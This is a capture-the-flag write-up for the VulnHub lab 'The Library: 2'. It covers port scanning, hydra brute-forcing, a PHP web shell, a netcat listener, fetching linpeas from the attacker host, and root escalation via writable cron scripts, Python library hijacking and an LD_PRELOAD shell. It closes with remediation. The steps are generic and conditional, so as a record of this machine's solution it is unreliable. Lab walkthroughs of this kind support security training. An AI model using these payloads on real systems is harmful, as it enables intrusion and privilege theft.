# The Library: 2 — Writeup

| Field | Value |
|---|---|
| **Target IP** | 192.168.1.x |
| **Attacker IP** | 192.168.1.y (Kali Linux) |
| **Difficulty** | Medium |
| **OS** | Linux |
| **Goal** | root flag |
| **Source** | [HackingArticles](https://www.hackingarticles.in/the-library2-vulnhub-walkthrough/) |

---

## Attack Summary

The Library: 2 is a Linux VM that presents a web application built on a CMS or custom framework. The attack chain involves web enumeration to identify the application, credential discovery or exploitation for initial access, and a privilege escalation path that typically involves misconfigured cron jobs, writable scripts, or library injection vulnerabilities.

---

## Methodology

1. Host discovery and port scan
2. Web application fingerprinting and directory enumeration
3. Vulnerability identification and exploitation for initial shell
4. Post-exploitation enumeration for privilege escalation vectors
5. Privilege escalation to root
6. Flag capture

---

## Step 1: Host Discovery and Port Scan

```bash
netdiscover
nmap -sV -sC -A 192.168.1.x
```

Expected open ports:
- 22 — SSH (OpenSSH)
- 80 — HTTP

![Nmap scan](images/01-nmap.png)

---

## Step 2: Web Enumeration

Browse to `http://192.168.1.x` and identify the web application. Perform thorough directory enumeration:

```bash
gobuster dir -u http://192.168.1.x \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -x php,html,txt,bak \
  -t 50

dirb http://192.168.1.x
```

Check for common sensitive files:

```bash
curl -s http://192.168.1.x/robots.txt
curl -s http://192.168.1.x/.htaccess
curl -s http://192.168.1.x/readme.txt
curl -s http://192.168.1.x/changelog.txt
```

If a WordPress installation is identified:

```bash
wpscan --url http://192.168.1.x --enumerate p,u,vt,tt
```

![Web enumeration](images/02-web-enum.png)

---

## Step 3: Initial Access

### Credential Brute-Force (SSH or Web)

If usernames are found during web enumeration:

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.x
```

Or via a web login form:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  http-post-form "192.168.1.x/login.php:username=^USER^&password=^PASS^:Invalid"
```

### Remote Code Execution via CMS

If a CMS dashboard is accessible, navigate to theme or plugin editors and inject a PHP reverse shell. Alternatively, use template injection in the available fields:

```php
<?php system($_GET['cmd']); ?>
```

Start a reverse shell listener:

```bash
nc -lvnp 4444
```

Trigger the payload through the browser. Once the shell connects, stabilize it:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Background with Ctrl+Z, then:
stty raw -echo; fg
```

![Initial shell](images/03-initial-shell.png)

---

## Step 4: Post-Exploitation Enumeration

```bash
id; whoami; uname -a
cat /etc/passwd | grep -v nologin
sudo -l
find / -perm -u=s -type f 2>/dev/null
cat /etc/crontab; ls -la /etc/cron*
find / -writable -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null 2>&1 | head -30
```

Transfer and run automated enumeration tools:

```bash
# On attacker:
python3 -m http.server 8000

# On target:
wget http://192.168.1.y:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_out.txt
```

---

## Step 5: Privilege Escalation

### Via Writable Script Called by Root Cron

If enumeration reveals a script run by a root cron job that is writable:

```bash
ls -la /path/to/script.sh
echo 'chmod u+s /bin/bash' >> /path/to/script.sh
# Wait for cron to execute...
/bin/bash -p
```

### Via Python Library Hijacking

If a Python script runs as root and imports a module from a user-writable directory:

```bash
# Check the Python path:
python3 -c "import sys; print(sys.path)"

# If a writable directory precedes the standard library:
echo 'import os; os.system("cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash")' \
  > /writable/path/<module_name>.py

# After the script executes:
/tmp/rootbash -p
```

### Via Sudo with LD_PRELOAD

If `sudo -l` shows `env_keep+=LD_PRELOAD`:

```c
// shell.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/sh");
}
```

```bash
gcc -fPIC -shared -o /tmp/shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <allowed_command>
```

![Privilege escalation](images/04-privesc.png)

---

## Step 6: Root Flag

```bash
id
cd /root
ls -la
cat root.txt
```

![Root flag](images/05-root-flag.png)

---

## Lessons Learned

- Web applications should not expose CMS admin panels to the network without IP whitelisting and strong authentication.
- Cron jobs running as root must use scripts stored in root-owned, non-writable directories.
- Python scripts with elevated privileges must control the Python import path (`sys.path`) to prevent library hijacking.
- `sudo` configurations should avoid `env_keep` entries like `LD_PRELOAD` that allow shared library injection.
- Regular privilege escalation path audits (via tools like linpeas) should be part of hardening procedures.

---

## Remediation

| Vulnerability | Fix |
|---|---|
| Exposed CMS admin without auth controls | Restrict admin paths by IP; enforce MFA |
| Root cron job on user-writable script | `chown root:root <script>; chmod 755 <script>` |
| Python library hijacking | Use virtual environments; control `sys.path` in elevated scripts |
| `LD_PRELOAD` in sudo `env_keep` | Remove `LD_PRELOAD` from `env_keep` in `/etc/sudoers` |
| Weak SSH or web credentials | Enforce complexity policy; rotate credentials periodically |
